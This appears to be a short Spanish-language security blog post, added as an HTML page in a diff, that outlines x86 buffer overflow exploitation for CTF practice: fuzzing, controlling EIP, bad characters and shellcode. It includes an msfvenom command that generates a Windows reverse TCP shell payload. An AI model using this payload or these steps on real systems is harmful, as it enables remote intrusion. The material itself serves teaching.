@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Buffer Overflow en x86: desde cero hasta shellcode — sexcott</title>
+  <meta name="description" content="Security researcher. CTF player. Documenting the journey."/>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Buffer Overflow en x86: desde cero hasta shellcode | sexcott</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Buffer Overflow en x86: desde cero hasta shellcode" />
+<meta name="author" content="sexcott" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Explicación práctica con ejemplos en 32-bit, debugging con GDB y técnicas básicas de explotación." />
+<meta property="og:description" content="Explicación práctica con ejemplos en 32-bit, debugging con GDB y técnicas básicas de explotación." />
+<link rel="canonical" href="http://localhost:4000/blog/2024/02/08/buffer-overflow-desde-cero/" />
+<meta property="og:url" content="http://localhost:4000/blog/2024/02/08/buffer-overflow-desde-cero/" />
+<meta property="og:site_name" content="sexcott" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-02-08T00:00:00-07:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Buffer Overflow en x86: desde cero hasta shellcode" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"sexcott"},"dateModified":"2024-02-08T00:00:00-07:00","datePublished":"2024-02-08T00:00:00-07:00","description":"Explicación práctica con ejemplos en 32-bit, debugging con GDB y técnicas básicas de explotación.","headline":"Buffer Overflow en x86: desde cero hasta shellcode","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/2024/02/08/buffer-overflow-desde-cero/"},"url":"http://localhost:4000/blog/2024/02/08/buffer-overflow-desde-cero/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body>
+
+  <nav class="site-nav">
+    <a href="/" class="nav-brand">
+      <span class="brand-name">sexcott</span><span class="brand-suffix">@sec:~$</span>
+    </a>
+    <ul class="nav-links">
+      <li><a href="/certs/">Certs</a></li>
+      <li><a href="/writeups/">CTF</a></li>
+      <li><a href="/blog/">Blog</a></li>
+      <li><a href="https://github.com/sexcott" target="_blank">GitHub</a></li>
+    </ul>
+  </nav>
+
+  <article>
+  <header class="page-header">
+    <div class="page-meta">
+      <span>2024-02-08</span>
+      <span>Técnico</span>
+    </div>
+    <h1 class="page-title">Buffer Overflow en x86: desde cero hasta shellcode</h1>
+  </header>
+
+  <div class="prose">
+    <p>El Buffer Overflow es uno de esos conceptos que suena intimidante hasta que lo ves en acción. Vamos paso a paso.</p>
+
+<h2 id="qué-es-un-buffer-overflow">¿Qué es un Buffer Overflow?</h2>
+
+<p>Cuando un programa copia datos en un buffer sin verificar su tamaño, puede sobrescribir regiones de memoria adyacentes — incluyendo la dirección de retorno de una función.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Stack frame:
+[ buffer (100 bytes) ][ EBP ][ EIP ] &lt;-- lo que queremos controlar
+</code></pre></div></div>
+
+<h2 id="proceso-completo">Proceso completo</h2>
+
+<h3 id="1-fuzzing--encontrar-el-crash">1. Fuzzing — encontrar el crash</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span>
+</code></pre></div></div>
+
+<h3 id="2-controlar-eip">2. Controlar EIP</h3>
+
+<p>Con <code class="language-plaintext highlighter-rouge">pattern_create</code> y <code class="language-plaintext highlighter-rouge">pattern_offset</code> de Metasploit encontramos el offset exacto.</p>
+
+<h3 id="3-bad-chars">3. Bad chars</h3>
+
+<p>Enviamos todos los bytes del <code class="language-plaintext highlighter-rouge">\x00</code> al <code class="language-plaintext highlighter-rouge">\xff</code> y observamos cuáles corrompen el payload.</p>
+
+<h3 id="4-shellcode">4. Shellcode</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>IP <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-f</span> python
+</code></pre></div></div>
+
+<hr />
+
+<p>En el próximo post veremos cómo aplicar esto en un entorno real con una máquina de HTB.</p>
+
+  </div>
+</article>
+
+
+  <footer class="site-footer">
+    <p class="footer-copy"><span>sexcott</span> · 2026</p>
+    <div class="footer-links">
+      <a href="https://github.com/sexcott" target="_blank">GitHub</a>
+      
+      
+    </div>
+  </footer>
+
+</body>
+</html>
